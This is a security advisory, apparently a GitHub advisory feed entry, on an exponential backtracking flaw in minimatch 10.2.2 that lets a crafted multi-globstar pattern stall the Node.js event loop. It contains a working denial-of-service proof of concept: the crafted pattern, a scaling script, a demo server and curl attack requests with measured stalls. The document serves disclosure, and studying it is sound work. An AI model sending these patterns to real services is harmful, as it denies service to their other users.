<p><code>matchOne()</code> performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent <code>**</code> (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where <code>n</code> is the number of path segments and <code>k</code> is the number of globstars. With k=11 and n=30, a call to the default <code>minimatch()</code> API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.</p>
<hr>
<h3 id="details">Details</h3>
<p>The vulnerable loop is in <code>matchOne()</code> at <a href="https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960"><code>src/index.ts#L960</code></a>:</p>
<pre><code class="language-typescript">while (fr &lt; fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
</code></pre>
<p>When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each <code>**</code> multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).</p>
<p>There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning <code>false</code> on a non-matching input.</p>
<p>Measured timing with n=30 path segments:</p>
<table>
<thead>
<tr>
<th>k (globstars)</th>
<th>Pattern size</th>
<th>Time</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>36 bytes</td>
<td>~154ms</td>
</tr>
<tr>
<td>9</td>
<td>46 bytes</td>
<td>~1.2s</td>
</tr>
<tr>
<td>11</td>
<td>56 bytes</td>
<td>~5.4s</td>
</tr>
<tr>
<td>12</td>
<td>61 bytes</td>
<td>~9.7s</td>
</tr>
<tr>
<td>13</td>
<td>66 bytes</td>
<td>~15.9s</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on <a href="mailto:minimatch@10.2.2">minimatch@10.2.2</a>, Node.js 20.</p>
<p><strong>Step 1 -- inline script</strong></p>
<pre><code class="language-javascript">import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
</code></pre>
<p>To scale the effect, increase k:</p>
<pre><code class="language-javascript">// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
</code></pre>
<p>No special options are required. This reproduces with the default <code>minimatch()</code> call.</p>
<p><strong>Step 2 -- HTTP server (event loop starvation proof)</strong></p>
<p>The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:</p>
<pre><code class="language-javascript">// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) =&gt; {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
</code></pre>
<p>Terminal 1 -- start the server:</p>
<pre><code>node poc1-server.mjs
</code></pre>
<p>Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:</p>
<pre><code>curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &amp;
</code></pre>
<p>Terminal 3 -- while the attack is in-flight, send a benign request:</p>
<pre><code>curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz"
</code></pre>
<p><strong>Observed output (Terminal 3):</strong></p>
<pre><code>{"result":true,"ms":"0"}

time_total: 4.132709s
</code></pre>
<p>The server reports <code>"ms":"0"</code> -- the legitimate request itself takes zero processing time. The 4+ second <code>time_total</code> is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:</p>
<pre><code>{"result":true,"ms":"0"}

time_total: 0.001599s
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p>Any application where an attacker can influence the glob pattern passed to <code>minimatch()</code> is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj">https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27903">https://nvd.nist.gov/vuln/detail/CVE-2026-27903</a></li>
<li><a href="https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748">https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748</a></li>
<li><a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj">https://github.com/advisories/GHSA-7r86-cg39-jmmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r86-cg39-jmmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:10:18.000Z</published>
    </entry>
</feed>